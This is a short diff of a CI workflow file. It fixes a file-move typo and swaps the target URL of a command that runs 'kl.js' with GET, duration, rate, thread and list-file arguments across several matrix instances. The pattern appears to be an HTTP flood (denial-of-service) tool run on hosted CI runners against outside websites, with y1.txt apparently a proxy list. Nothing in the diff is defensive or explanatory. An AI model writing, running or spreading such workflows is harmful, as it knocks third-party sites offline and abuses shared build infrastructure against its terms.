@@ -41,10 +41,10 @@ jobs:
           cd ideal-guide
           
           unzip Fc-main.zip
-          mc y1.txt Fc-main/y1.txt
+          mv y1.txt Fc-main/y1.txt
           
           cd Fc-main
-          node kl.js GET https://rapidis.gay/6901966783-27a9fc9d-6c8a-4f8f-8162-9e3412e3e904 300 4 120 y1.txt --auth --debug --full
+          node kl.js GET https://xpert.lol/8222124889-85708b9e-ac82-4994-b18c-3e189111491f 300 4 120 y1.txt --auth --debug --full
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
